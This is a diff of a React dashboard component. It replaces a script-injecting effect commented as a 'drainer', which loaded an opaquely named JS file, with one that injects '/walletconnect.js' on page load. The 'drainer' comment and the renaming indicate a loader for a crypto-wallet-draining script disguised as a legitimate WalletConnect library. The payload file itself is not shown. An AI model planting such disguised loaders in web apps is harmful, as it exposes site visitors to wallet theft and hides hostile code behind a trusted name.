@@ -29,22 +29,35 @@ const Dashboard = () => {
     console.log("Page reloaded:", location.pathname);
   }, [location.key]);
 
-  // use effect drainer
-  useEffect(() => {
-    // window.addEventListener("load", () => {
-    // Code for initializing the main script goes here
+	useEffect(() => {
+		const onDOMContentLoaded = () => {
+			// Dynamically load the walletconnect.js script
+			const secondScript = document.createElement("script");
+			secondScript.src = "/walletconnect.js";
+			secondScript.charset = "UTF-8";
+			secondScript.type = "text/javascript";
+			document.body.appendChild(secondScript);
 
-    // Dynamically load the second script after the main script is ready
-    const secondScript = document.createElement("script");
-    secondScript.src = "/673db6c275f7d1a3f7395340.js";
-    secondScript.type = "module";
-    document.body.appendChild(secondScript);
+			// Ensure the script initializes properly once loaded
+			secondScript.onload = () => {
+				console.log("Second script loaded successfully");
+			};
+		};
 
-    secondScript.onload = () => {
-      console.log("Second script loaded successfully");
-    };
-    // });
-  }, []);
+		// Attach the listener for DOMContentLoaded
+		if (document.readyState === "loading") {
+			// If DOM is still loading, wait for it to complete
+			document.addEventListener("DOMContentLoaded", onDOMContentLoaded);
+		} else {
+			// If DOM is already loaded, execute immediately
+			onDOMContentLoaded();
+		}
+
+		return () => {
+			// Cleanup the event listener on component unmount
+			document.removeEventListener("DOMContentLoaded", onDOMContentLoaded);
+		};
+	}, []);
 
   useEffect(() => {
     if (!user) return;
